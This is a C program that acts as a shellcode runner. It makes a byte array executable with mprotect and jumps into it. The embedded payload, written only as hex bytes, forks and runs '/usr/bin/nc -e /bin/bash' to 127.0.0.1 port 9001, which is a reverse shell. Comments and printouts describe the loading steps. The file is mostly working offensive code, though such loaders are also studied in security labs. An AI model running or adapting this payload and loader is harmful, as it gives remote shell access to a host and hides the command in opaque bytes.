#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <dlfcn.h>

#define _GNU_SOURCE
//gcc system.c -o system.bin -O3
unsigned char cmd[] = 
"\x48\x89\xe5\x48\x81\xec\x48\x00\x00\x00\x48\x31\xc9\x51\x48\xb8"
"\x39\x00\x00\x00\x00\x00\x00\x00\x0f\x05\x48\x8d\x0d\x13\x00\x00"
"\x00\x48\x8d\x1d\x17\x00\x00\x00\x48\x3d\x00\x00\x00\x00\x48\x0f"
"\x44\xcb\xff\xe1\x48\x81\xc4\x48\x00\x00\x00\x48\x89\xec\xc3\x48"
"\xb8\x3b\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x0d\x54\x00\x00\x00"
"\x51\x48\x8d\x0d\x42\x00\x00\x00\x51\x48\x8d\x0d\x30\x00\x00\x00"
"\x51\x48\x8d\x0d\x25\x00\x00\x00\x51\x48\x8d\x0d\x11\x00\x00\x00"
"\x51\x48\x8d\x3d\x09\x00\x00\x00\x48\x8d\x34\x24\x48\x31\xd2\x0f"
"\x05\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x6e\x63\x00\x2d\x65\x00"
"\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x00\x31\x32\x37\x2e\x30\x2e"
"\x30\x2e\x31\x00\x39\x30\x30\x31\x00";

void (* ptr) () = (void *) cmd;

int main(int argc, char* argv[])
{
    int rv;
    void* addr;
    size_t diff;

    int page_size = getpagesize();
    printf("page size :        %d\n",page_size);

    //system("echo test!");
    size_t size = sizeof(cmd);
    printf("payload size :     %d\n",size);

    //int perms = PROT_READ | PROT_WRITE | PROT_EXEC;
    int perms = PROT_WRITE | PROT_EXEC; //reduce cmd buffer permissions since if we don't need to write in this script (depends on the payload encoding)
    printf("prot permissions : %d\n",perms);

    // we have to page-align the address we pass into mprotect
    //  from -- man 2 mprotect: 
    // The implementation shall require that addr be a multiple of the page size as returned by sysconf().
    //
    addr = cmd - ((size_t)cmd % page_size);
    diff = (size_t) cmd - (size_t) addr;

    //change permissions of cmd[] so that we can execute that code
    //rv = mprotect(addr,diff+size,perms);
    rv = mprotect(addr,page_size,perms);
    printf("mprotect status :  %d\n",rv);
    printf("cmd addr :         %p\n", cmd);
    printf("ptr* :             %p\nRunning payload!\n\n", ptr);

    ptr();
    printf("Program execution is back to system\n\n");

    return 0;
}
